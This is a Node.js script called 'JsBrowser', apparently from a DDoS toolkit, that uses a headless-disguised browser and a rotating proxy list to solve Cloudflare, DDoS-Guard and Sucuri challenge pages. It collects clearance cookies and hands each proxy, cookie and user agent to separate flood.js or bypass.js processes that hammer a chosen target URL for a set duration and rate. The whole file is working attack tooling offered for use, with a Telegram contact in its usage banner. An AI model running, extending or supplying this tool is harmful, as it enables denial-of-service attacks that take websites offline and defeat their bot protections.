const { connect } = require('puppeteer-real-browser');
const timers = require('timers/promises');
const chalk = require('chalk');
const { spawn, exec } = require('child_process');
const fs = require('fs');
const cluster = require('cluster');
const colors = require('colors');
const os = require('os');

process.on("uncaughtException", function (error) {});
process.on("unhandledRejection", function (error) {});
process.setMaxListeners(0);


const skipStats = {
    BLACKLISTED: 0,
    TIMEOUT: 0,
    BLOCKED: 0,
    INVALID_COOKIE: 0,
    FAILED_LOAD: 0,
    ALREADY_USED: 0,
    POOR_QUALITY: 0,
    TOTAL: 0
};

function logSkip(proxy, reason, details = '') {
    skipStats[reason] = (skipStats[reason] || 0) + 1;
    skipStats.TOTAL++;

    const timestamp = new Date().toISOString();
    const logLine = `${chalk.red('[SKIP]')} ${chalk.yellow.bold(`[${reason}]`)} ${chalk.gray(proxy)} ${details ? '- ' + chalk.dim(details) : ''}`;

    console.log(logLine);

    // Write to file
    const fileLog = `${timestamp} [${reason}] ${proxy} ${details}\n`;
    fs.appendFileSync('skipped_proxies.txt', fileLog);
}

function printSkipSummary() {
    if (skipStats.TOTAL === 0) return;

    console.log('\n' + chalk.bgBlue.white.bold(' === SKIP SUMMARY === '));
    console.log(chalk.cyan(`Total skipped: ${skipStats.TOTAL}`));

    const entries = Object.entries(skipStats)
        .filter(([k]) => k !== 'TOTAL')
        .sort((a, b) => b[1] - a[1]);

    entries.forEach(([reason, count], i) => {
        if (count === 0) return;
        const percent = ((count / skipStats.TOTAL) * 100).toFixed(1);
        const symbol = i === entries.length - 1 ? '└─' : '├─';
        console.log(`${symbol} ${chalk.yellow(reason)}: ${count} (${percent}%)`);
    });
    console.log('');
}

if (process.argv.length < 7) {
    console.clear();
    console.log(`

${colors.white.bold(`JsBrowser`)} - Fast Solver Bypass Captcha/UAM Cloudflare

${colors.green.bold(`Contact`)}: t.me/bixd08

${colors.magenta.bold(`USAGE`)}:
node browser.js Target Time Thread Rate ProxyFile (option)

${colors.magenta.bold(`OPTIONS JsBrowser`)}:
--headless true/false - Render browser with UI (${colors.yellow.bold(`default`)}: false)
--flooder true/false - Enable JsFlood process (${colors.yellow.bold(`default`)}: false)
--threads - JsFlooder threads (${colors.yellow.bold(`default`)}: 1)
--auth true/false - Enable proxy authentication format ip:port:username:passwd (${colors.yellow.bold(`default`)}: false)
--cookies - Cookie collection iterations (${colors.yellow.bold(`default`)}: 20)

`);
    process.exit(0);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const rate = parseInt(process.argv[5]);
const proxyfile = process.argv[6];

let usedProxies = {};
let d = new Date();
let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
    hours = "undefined";
    minutes = "undefined";
    seconds = "undefined";
}

function error(msg) {
    console.log(` ${'['.red}${'error'.bold}${']'.red} ${msg}`);
    process.exit(0);
}

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

function exit() {
    for (const flooder of flooders) {
        flooder.kill();
    }

    exec('pkill -f chrome');

    printSkipSummary();

    log(1, `${'JsBrowser HARDCORE Has End'.bold}`);

    if (fs.existsSync('cookie_count.txt')) {
        fs.unlinkSync('cookie_count.txt');
    }

    process.exit(0);
}

process.on('SIGTERM', () => {
    exit();
}).on('SIGINT', () => {
    exit();
});

const options = [
    { flag: '--auth', value: get_option('--auth'), default: false },
    { flag: '--cookies', value: get_option('--cookies'), default: 20 },
    { flag: '--debug', value: get_option('--debug'), default: false },
    { flag: '--headless', value: get_option('--headless'), default: false },
    { flag: '--flooder', value: get_option('--flooder'), default: false },
    { flag: '--threads', value: get_option('--threads'), default: 1 },
    { flag: '--bypass', value: get_option('--bypass'), default: false },
    { flag: '--randmethod', value: get_option('--randmethod'), default: false },
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) {
        return false;
    }

    const optionValue = option.value;

    if (option.value === undefined && option.default) {
        return option.default;
    }

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    } else if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    } else {
        return false;
    }
}

const raw_proxies = fs.readFileSync(proxyfile, "utf-8").toString().replace(/\r/g, "").split("\n").filter((word) => word.trim().length > 0);

var parsed = new URL(target);

function shuffle_proxies(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

const proxies = shuffle_proxies(raw_proxies);
let liveProxies = [];

var headless = enabled('headless');
var authOpt = enabled('auth');
const desired_cookies = enabled('cookies') || 1;
var debug = enabled('debug');
var flooderEnabled = enabled('flooder');
var bypassMode = enabled('bypass');
var thread_flood = enabled('threads') || 1;
var randmethod = enabled('randmethod');

let proxyStats = {};
let blacklistedProxies = new Set();
const MAX_BLACKLIST_SIZE = 100;

function blacklistProxy(proxy, reason) {
    blacklistedProxies.add(proxy);
    logSkip(proxy, 'BLACKLISTED', reason);

    if (blacklistedProxies.size > MAX_BLACKLIST_SIZE) {
        const firstProxy = blacklistedProxies.values().next().value;
        blacklistedProxies.delete(firstProxy);
    }
}

function isBlacklisted(proxy) {
    return blacklistedProxies.has(proxy);
}

function updateProxyStats(proxy, success, solveTime) {
    if (!proxyStats[proxy]) {
        proxyStats[proxy] = {
            successes: 0,
            failures: 0,
            avgTime: 0,
            totalTime: 0
        };
    }

    if (success) {
        proxyStats[proxy].successes++;
        proxyStats[proxy].totalTime += solveTime;
        proxyStats[proxy].avgTime = proxyStats[proxy].totalTime / proxyStats[proxy].successes;
    } else {
        proxyStats[proxy].failures++;
    }
}

function getProxyQuality(proxy) {
    if (!proxyStats[proxy]) return 'unknown';
    const stats = proxyStats[proxy];
    const total = stats.successes + stats.failures;
    if (total === 0) return 'unknown';

    const successRate = stats.successes / total;

    
    if (stats.failures >= 2 && successRate < 0.4) return 'poor';
    if (successRate > 0.75 && stats.avgTime < 12000) return 'good';
    if (successRate >= 0.5) return 'medium';

    return 'poor';
}

async function collectLiveProxies() {
    liveProxies = proxies.slice();
}

const cache = [];
const flooders = [];

function log(type, string) {
    let script;
    switch (type) {
        case 1:
            script = "JsBrowser";
            break;
        case 2:
            script = "JsFlooder";
            break;
        default:
            script = "Status";
            break;
    }

    if (enabled('debug')) {
        console.log(`(${colors.magenta.bold(script)}/${colors.yellow.bold(`BixD`)}) | (${`${hours}:${minutes}:${seconds}`.cyan}) | (${chalk.gray.bold(parsed.hostname)}) | ${string}`);
    }
}

function random_int(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

let lastLogTime = 0;
const LOG_INTERVAL = 8000;

function throttledLog(type, string) {
    const now = Date.now();
    if (now - lastLogTime >= LOG_INTERVAL) {
        log(type, string);
        lastLogTime = now;
    }
}

function get_count() {
    if (!fs.existsSync('cookie_count.txt')) {
        return 0;
    }
    return parseInt(fs.readFileSync('cookie_count.txt', 'utf-8') || '0');
}

function increment_count() {
    let c = get_count();
    fs.writeFileSync('cookie_count.txt', (c + 1).toString());
}

async function flooder(proxy, ua, cookie) {
    let args;
    if (bypassMode) {
        args = [
            "bypass.js",
            "GET",
            target,
            duration,
            thread_flood.toString(),
            rate,
            proxy,
            `${cookie}`,
            `${ua}`,
        ];
    } else {
        args = [
            "flood.js",
            target,
            duration,
            thread_flood.toString(),
            proxy,
            rate,
            `${cookie}`,
            `${ua}`,
            "--cookie true",
        ];
    }

    if (randmethod) {
        args.push('--randmethod');
    }

    if (debug) {
        args.push('--debug true');
    }

    const flooder_process = spawn("node", args, { stdio: 'pipe' });
    flooders.push(flooder_process);

    flooder_process.stdout.on('data', (data) => {
        const lines = data.toString().split('\n').filter(line => line.trim() !== '');
        for (const line of lines) {
            if (line.includes('Restart Browser')) {
                log(2, "Restarting Browser".bold);
                flooder_process.kill();

                if (cache.length > 0) {
                    const random_index = Math.floor(Math.random() * cache.length);
                    const item = cache[random_index];
                    if (flooderEnabled) {
                        flooder(item["proxy"], item["ua"], item["cookie"]);
                    }
                    cache.splice(random_index, 1);
                } else {
                    mainLoop();
                }
                return;
            } else {
                throttledLog(1, line.trim());
            }
        }
    });

    flooder_process.stderr.on('data', () => {
        flooder_process.kill();
    });

    flooder_process.on('error', () => {
        flooder_process.kill();
    });

    flooder_process.on('close', () => {
        flooder_process.kill();
    });
}

async function isChallengeSolved(page, protections) {
    try {
        const cookiesCheck = await page.evaluate(() => {
            const cfClearance = document.cookie.split(';').find(row => row.startsWith('cf_clearance='));
            const cfBM = document.cookie.split(';').find(row => row.startsWith('__cf_bm='));
            return (cfClearance && cfClearance.split('=')[1] && cfClearance.split('=')[1].length > 10) ||
                   (cfBM && cfBM.split('=')[1] && cfBM.split('=')[1].length > 10);
        });

        if (cookiesCheck) {
            const quickCheck = await page.evaluate(() => {
                return document.readyState === 'complete' &&
                       !document.body.innerHTML.includes('Just a moment');
            });
            if (quickCheck) return true;
        }

        const title = await page.title();
        if (title && protections.some(p => title.toLowerCase().includes(p))) {
            return false;
        }

        const isSolved = await page.evaluate(() => {
            return document.readyState === 'complete' &&
                   !document.body.innerHTML.includes('Just a moment') &&
                   !document.body.querySelector('.cf-browser-verification') &&
                   !document.body.querySelector('[data-ray]') &&
                   document.body.children.length > 0;
        });

        return isSolved && cookiesCheck;
    } catch (err) {
        return false;
    }
}

async function mainLoop() {
    while (true) {
        let reserve = false;
        await main(reserve);
    }
}

async function main(reserve) {
    const startTime = Date.now();
    let Page, Browser;

    return new Promise(async (resolve) => {
        if (get_count() >= desired_cookies) {
            await timers.setTimeout(1000);
            resolve();
            return;
        }

        let proxy = proxies[~~(Math.random() * proxies.length)];
        let attempts = 0;

        while (usedProxies[proxy] || isBlacklisted(proxy)) {
            if (isBlacklisted(proxy)) {
                logSkip(proxy, 'ALREADY_USED', 'In blacklist');
            }

            if (Object.keys(usedProxies).length == proxies.length) {
                usedProxies = {};
                break;
            }

            proxy = proxies[~~(Math.random() * proxies.length)];

            attempts++;
            if (attempts > proxies.length * 2) {
                console.log(`${chalk.yellow('[WARNING]')} Too many blacklisted proxies, clearing...`);
                blacklistedProxies.clear();
                break;
            }
        }

        usedProxies[proxy] = true;
        let [proxy_host, proxy_port] = proxy.split(':');

        if (enabled('debug')) {
            console.log(`Start chrome run with addressProxy: ${colors.magenta(`${proxy_host}:${proxy_port}`)}`);
        }

        try {
            let proxy_plugin = {
                host: proxy_host,
                port: proxy_port
            };

            if (authOpt) {
                let [host, port, username, password] = proxy.split(':');
                proxy_plugin = {
                    host: host,
                    port: parseInt(port),
                    username: username,
                    password: password
                };
            }

            let { page, browser } = await connect({
                turnstile: true,
                headless: headless,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--no-first-run',
                    '--no-zygote',
                    '--disable-gpu',
                    '--disable-extensions',
                    '--disable-background-networking',
                    '--disable-default-apps',
                    '--disable-sync',
                    '--metrics-recording-only',
                    '--mute-audio',
                    '--no-default-browser-check',
                    '--disable-background-timer-throttling',
                    '--disable-backgrounding-occluded-windows',
                    '--disable-renderer-backgrounding',
                    '--disable-images', 
                    '--memory-pressure-off',
                    '--max_old_space_size=256'

                ],
                customConfig: {},
                connectOption: {},
                connectTimeout: 60000,
                ignoreAllFlags: false,
                proxy: proxy_plugin
            });

            Browser = browser;
            Page = page;

            var userAgent = await page.evaluate(() => {
                return navigator.userAgent;
            });

            if (userAgent.includes("Headless")) {
                userAgent = userAgent.replace('Headless', '');
                await page.setUserAgent(userAgent);
            }

            const proxyQuality = getProxyQuality(proxy);

            
            if (proxyQuality === 'poor' && proxyStats[proxy]) {
                const stats = proxyStats[proxy];
                const total = stats.successes + stats.failures;

                if (total >= 2) {
                    blacklistProxy(proxy, `Poor quality (${stats.failures}/${total} failures, ${Math.round(stats.avgTime)}ms avg)`);
                    logSkip(proxy, 'POOR_QUALITY', `${stats.failures}/${total} failures`);

                    if (Page) await Page.close().catch(() => {});
                    if (Browser) await Browser.close().catch(() => {});
                    delete usedProxies[proxy];
                    resolve();
                    return;
                }
            }

            let gotoTimeout = 25000;
            let waitStrategy = 'domcontentloaded';

            if (proxyQuality === 'good') {
                gotoTimeout = 15000;
            } else if (proxyQuality === 'poor') {
                gotoTimeout = 20000;
            }

            await page.goto(target, {
                waitUntil: waitStrategy,
                timeout: gotoTimeout
            });

            let titles = [];
            let protections = [
                'just a moment...',
                'ddos-guard',
                '403 forbidden',
                'security check',
                'One more step',
                'Sucuri WebSite Firewall'
            ];

            const maxWaitTime = proxyQuality === 'good' ? 25000 :
                                proxyQuality === 'medium' ? 35000 : 40000;

            const pollInterval = 100;

            const titleCheckPromise = new Promise((resolve, reject) => {
                let pollCount = 0;
                const poll = async () => {
                    pollCount++;
                    try {
                        const solved = await isChallengeSolved(page, protections);
                        if (solved) {
                            clearInterval(interval);
                            resolve(true);
                            return;
                        }

                        const title = await page.title();

                        if (title.startsWith("Failed to load URL ")) {
                            clearInterval(interval);
                            logSkip(proxy, 'FAILED_LOAD', title);
                            reject(new Error("Failed to load URL"));
                            return;
                        }

                        if (!title) {
                            titles.push(parsed.hostname);
                            clearInterval(interval);
                            resolve(true);
                            return;
                        }

                        if (title !== titles[titles.length - 1]) {
                            log(1, `Challenge has been discovered: ${colors.italic(title)}`);
                        }

                        let isBlocked = false;
                        if (title === 'Attention Required! | Cloudflare') {
                            isBlocked = true;
                            log(1, `${colors.bold('Title')}: ${colors.italic(title)}`);
                            logSkip(proxy, 'BLOCKED', 'Cloudflare blocked');
                            updateProxyStats(proxy, false, Date.now() - startTime);

                            if (Page) await Page.close().catch(() => {});
                            if (Browser) await Browser.close().catch(() => {});
                            delete usedProxies[proxy];
                            resolve();
                            return;
                        }

                        titles.push(title);

                        if (!protections.some(p => title.toLowerCase().includes(p))) {
                            clearInterval(interval);
                            resolve(true);
                            return;
                        }

                    } catch (err) {
                        if (pollCount >= 5) {
                            clearInterval(interval);
                            reject(err);
                            return;
                        }
                    }
                };

                const interval = setInterval(poll, pollInterval);
                poll();

                setTimeout(() => {
                    clearInterval(interval);
                    logSkip(proxy, 'TIMEOUT', `Exceeded ${maxWaitTime/1000}s`);
                    reject(new Error("Timeout waiting for challenge solve"));
                }, maxWaitTime);
            });

            try {
                await titleCheckPromise;
            } catch (err) {
                updateProxyStats(proxy, false, Date.now() - startTime);

                if (Page) await Page.close().catch(() => {});
                if (Browser) await Browser.close().catch(() => {});
                delete usedProxies[proxy];
                resolve();
                return;
            }

            await timers.setTimeout(random_int(500, 1000));

            var cookies = await page.cookies();
            const _cookie = cookies.map((c) => `${c.name}=${c.value}`).join("; ");

            if (_cookie.includes('cf_clearance=') || _cookie.includes('__cf_bm=')) {
                const cfValue = _cookie.split('cf_clearance=')[1]?.split(';')[0] || _cookie.split('__cf_bm=')[1]?.split(';')[0];

                if (cfValue && cfValue.length < 10) {
                    logSkip(proxy, 'INVALID_COOKIE', `Cookie length: ${cfValue.length}`);
                    updateProxyStats(proxy, false, Date.now() - startTime);

                    if (Page) await Page.close().catch(() => {});
                    if (Browser) await Browser.close().catch(() => {});
                    delete usedProxies[proxy];
                    resolve();
                    return;
                }
            } else {
                log(1, `${chalk.black.bold.bgRed('Warning')}: No clearance cookie found, may be invalid`);
            }

            fs.appendFileSync('cookies.txt', `${proxy} | ${userAgent} | ${_cookie}\n\n`);

            const endTime = Date.now();
            const solveTime = Math.floor((endTime - startTime) / 1000);

            updateProxyStats(proxy, true, endTime - startTime);
            increment_count();

            const totalCookies = get_count();
            const pageTitle = await page.title();

            console.log(`{`);
            console.log(`  ${chalk.black.bold.bgWhite('pageTitle')}: ${colors.green(pageTitle)}`);
            console.log(`  ${chalk.black.bold.bgWhite('proxyAddress')}: ${colors.green(proxy)}`);
            console.log(`  ${chalk.black.bold.bgWhite('userAgent')}: ${colors.green(userAgent)}`);
            console.log(`  ${chalk.black.bold.bgWhite('cookieFound')}: ${colors.green(_cookie)}`);
            console.log(`  ${chalk.black.bold.bgWhite('Time_Solver')}: ${colors.green(`${solveTime}s`)}`);
            console.log(`  ${chalk.black.bold.bgWhite('Total_Cookies')}: ${colors.green(totalCookies)}`);
            console.log(`},`);

            await page.close();
            await browser.close();

            if (!reserve && flooderEnabled) {
                flooder(proxy, userAgent, _cookie);
            } else if (reserve) {
                cache.push({
                    proxy: proxy,
                    ua: userAgent,
                    cookie: _cookie
                });
            }

            delete usedProxies[proxy];
            resolve();

        } catch (err) {
            logSkip(proxy, 'FAILED_LOAD', err.message);
            updateProxyStats(proxy, false, Date.now() - startTime);

            if (Page) await Page.close().catch(() => {});
            if (Browser) await Browser.close().catch(() => {});
            delete usedProxies[proxy];

            await timers.setTimeout(1000);
            resolve();
        }
    });
}

async function cacheLoop(x = 1) {
    if (x >= duration) return;

    try {
        if (get_count() < desired_cookies) {
            await main(true);
        }
    } catch (err) {
    }

    setTimeout(() => cacheLoop(x + 1), 60000);
}

if (cluster.isPrimary) {
    fs.writeFileSync('cookie_count.txt', '0');

    // Clear old skip log
    if (fs.existsSync('skipped_proxies.txt')) {
        fs.unlinkSync('skipped_proxies.txt');
    }

    (async () => {
        await collectLiveProxies();
        setTimeout(() => exit(), Number(duration) * 1000);

        for (let i = 0; i < threads; i++) {
            cluster.fork();
        }

        cacheLoop();
    })();
} else {
    mainLoop();
}
